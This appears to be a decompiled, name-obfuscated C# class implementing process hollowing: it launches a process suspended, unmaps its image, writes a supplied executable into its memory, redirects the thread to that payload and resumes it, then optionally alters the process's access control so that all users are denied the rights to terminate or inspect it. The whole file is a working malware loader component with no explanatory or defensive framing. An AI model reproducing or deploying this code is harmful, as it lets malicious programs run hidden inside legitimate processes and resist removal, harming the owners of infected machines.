using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.AccessControl;
using System.Security.Principal;

public static class GClass61
{
	[StructLayout(LayoutKind.Sequential, Pack = 1)]
	private struct Struct22
	{
		public readonly IntPtr intptr_0;

		public readonly IntPtr intptr_1;

		public readonly uint uint_0;

		private readonly uint uint_1;
	}

	[StructLayout(LayoutKind.Sequential, Pack = 1)]
	private struct Struct23
	{
		public uint uint_0;

		private readonly string string_0;

		private readonly string string_1;

		private readonly string string_2;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 36)]
		private readonly byte[] byte_0;

		private readonly IntPtr intptr_0;

		private readonly IntPtr intptr_1;

		private readonly IntPtr intptr_2;

		private readonly IntPtr intptr_3;
	}

	private enum Enum12
	{
		const_0 = 65536,
		const_1 = 524288,
		const_2 = 987135,
		const_3 = 128,
		const_4 = 2,
		const_5 = 64,
		const_6 = 1024,
		const_7 = 4096,
		const_8 = 512,
		const_9 = 256,
		const_10 = 2048,
		const_11 = 1,
		const_12 = 8,
		const_13 = 16,
		const_14 = 32,
		const_15 = 131072,
		const_16 = 983040,
		const_17 = 256,
		const_18 = 262144
	}

	[DllImport("kernel32.dll", CharSet = CharSet.Unicode)]
	[SuppressUnmanagedCodeSecurity]
	private static extern bool CreateProcess(string applicationName, string commandLine, IntPtr processAttributes, IntPtr threadAttributes, bool inheritHandles, uint creationFlags, IntPtr environment, string currentDirectory, ref Struct23 startupInfo, ref Struct22 processInformation);

	[DllImport("kernel32.dll")]
	[SuppressUnmanagedCodeSecurity]
	private static extern bool GetThreadContext(IntPtr thread, int[] context);

	[DllImport("kernel32.dll")]
	[SuppressUnmanagedCodeSecurity]
	private static extern bool Wow64GetThreadContext(IntPtr thread, int[] context);

	[DllImport("kernel32.dll")]
	[SuppressUnmanagedCodeSecurity]
	private static extern bool SetThreadContext(IntPtr thread, int[] context);

	[DllImport("kernel32.dll")]
	[SuppressUnmanagedCodeSecurity]
	private static extern bool Wow64SetThreadContext(IntPtr thread, int[] context);

	[DllImport("kernel32.dll")]
	[SuppressUnmanagedCodeSecurity]
	private static extern bool ReadProcessMemory(IntPtr process, int baseAddress, ref int buffer, int bufferSize, ref int bytesRead);

	[DllImport("kernel32.dll")]
	[SuppressUnmanagedCodeSecurity]
	private static extern bool WriteProcessMemory(IntPtr process, int baseAddress, byte[] buffer, int bufferSize, ref int bytesWritten);

	[DllImport("ntdll.dll")]
	[SuppressUnmanagedCodeSecurity]
	private static extern int NtUnmapViewOfSection(IntPtr process, int baseAddress);

	[DllImport("kernel32.dll")]
	[SuppressUnmanagedCodeSecurity]
	private static extern int VirtualAllocEx(IntPtr handle, int address, int length, int type, int protect);

	[DllImport("kernel32.dll")]
	[SuppressUnmanagedCodeSecurity]
	private static extern int ResumeThread(IntPtr handle);

	public static bool smethod_0(string path, byte[] data, string args, bool protect)
	{
		int num = 1;
		while (true)
		{
			if (num <= 5)
			{
				if (smethod_1(path, data, args, protect))
				{
					break;
				}
				num++;
				continue;
			}
			return false;
		}
		return true;
	}

	private static bool smethod_1(string path, byte[] data, string args, bool protect)
	{
		int bytesRead = 0;
		Struct23 startupInfo = default(Struct23);
		Struct22 processInformation = default(Struct22);
		startupInfo.uint_0 = Convert.ToUInt32(Marshal.SizeOf(typeof(Struct23)));
		try
		{
			if (!CreateProcess(path, args, IntPtr.Zero, IntPtr.Zero, inheritHandles: false, 134217732u, IntPtr.Zero, null, ref startupInfo, ref processInformation))
			{
				throw new Exception();
			}
			int num = BitConverter.ToInt32(data, 60);
			int num2 = BitConverter.ToInt32(data, num + 26 + 26);
			int[] array = new int[179];
			array[0] = 65538;
			if (IntPtr.Size == 4)
			{
				if (!GetThreadContext(processInformation.intptr_1, array))
				{
					throw new Exception();
				}
			}
			else if (!Wow64GetThreadContext(processInformation.intptr_1, array))
			{
				throw new Exception();
			}
			int num3 = array[41];
			int buffer = 0;
			if (!ReadProcessMemory(processInformation.intptr_0, num3 + 4 + 4, ref buffer, 4, ref bytesRead))
			{
				throw new Exception();
			}
			if (num2 == buffer && NtUnmapViewOfSection(processInformation.intptr_0, buffer) != 0)
			{
				throw new Exception();
			}
			int length = BitConverter.ToInt32(data, num + 80);
			int bufferSize = BitConverter.ToInt32(data, num + 42 + 42);
			bool flag = false;
			int num4 = VirtualAllocEx(processInformation.intptr_0, num2, length, 12288, 64);
			if (num4 == 0)
			{
				throw new Exception();
			}
			if (!WriteProcessMemory(processInformation.intptr_0, num4, data, bufferSize, ref bytesRead))
			{
				throw new Exception();
			}
			int num5 = num + 248;
			short num6 = BitConverter.ToInt16(data, num + 3 + 3);
			for (int i = 0; i < num6; i++)
			{
				int num7 = BitConverter.ToInt32(data, num5 + 6 + 6);
				int num8 = BitConverter.ToInt32(data, num5 + 8 + 8);
				int srcOffset = BitConverter.ToInt32(data, num5 + 20);
				if (num8 != 0)
				{
					byte[] array2 = new byte[num8];
					Buffer.BlockCopy(data, srcOffset, array2, 0, array2.Length);
					if (!WriteProcessMemory(processInformation.intptr_0, num4 + num7, array2, array2.Length, ref bytesRead))
					{
						throw new Exception();
					}
				}
				num5 += 40;
			}
			byte[] bytes = BitConverter.GetBytes(num4);
			if (!WriteProcessMemory(processInformation.intptr_0, num3 + 8, bytes, 4, ref bytesRead))
			{
				throw new Exception();
			}
			int num9 = BitConverter.ToInt32(data, num + 40);
			if (flag)
			{
				num4 = num2;
			}
			array[44] = num4 + num9;
			if (IntPtr.Size == 4)
			{
				if (!SetThreadContext(processInformation.intptr_1, array))
				{
					throw new Exception();
				}
			}
			else if (!Wow64SetThreadContext(processInformation.intptr_1, array))
			{
				throw new Exception();
			}
			if (ResumeThread(processInformation.intptr_1) == -1)
			{
				throw new Exception();
			}
			if (protect)
			{
				smethod_5(processInformation.intptr_0);
			}
		}
		catch
		{
			Process.GetProcessById(Convert.ToInt32(processInformation.uint_0)).Kill();
			return false;
		}
		return true;
	}

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool GetKernelObjectSecurity(IntPtr Handle, int securityInformation, [Out] byte[] pSecurityDescriptor, uint nLength, ref uint lpnLengthNeeded);

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool SetKernelObjectSecurity(IntPtr Handle, int securityInformation, [In] byte[] pSecurityDescriptor);

	private static void smethod_2(IntPtr processHandle, RawSecurityDescriptor rawSecurityDescriptor)
	{
		byte[] array = new byte[checked(rawSecurityDescriptor.BinaryLength - 1 + 1 - 1 + 1)];
		rawSecurityDescriptor.GetBinaryForm(array, 0);
		if (!SetKernelObjectSecurity(processHandle, 4, array))
		{
			throw new Win32Exception();
		}
	}

	private static T smethod_3<T>(ref T target, T value)
	{
		target = value;
		return value;
	}

	private static RawSecurityDescriptor smethod_4(IntPtr processHandle)
	{
		byte[] target = new byte[0];
		uint lpnLengthNeeded = 0u;
		GetKernelObjectSecurity(processHandle, 4, target, 0u, ref lpnLengthNeeded);
		if ((long)lpnLengthNeeded > 32767L)
		{
			throw new Win32Exception();
		}
		checked
		{
			if (!GetKernelObjectSecurity(processHandle, 4, smethod_3(ref target, new byte[(int)(unchecked((ulong)lpnLengthNeeded) - 1uL) + 1 - 1 + 1]), lpnLengthNeeded, ref lpnLengthNeeded))
			{
				throw new Win32Exception();
			}
			return new RawSecurityDescriptor(target, 0);
		}
	}

	private static void smethod_5(IntPtr processHandle)
	{
		RawSecurityDescriptor rawSecurityDescriptor = smethod_4(processHandle);
		rawSecurityDescriptor.DiscretionaryAcl!.InsertAce(0, new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 987135, new SecurityIdentifier(WellKnownSidType.WorldSid, null), isCallback: false, null));
		smethod_2(processHandle, rawSecurityDescriptor);
	}
}
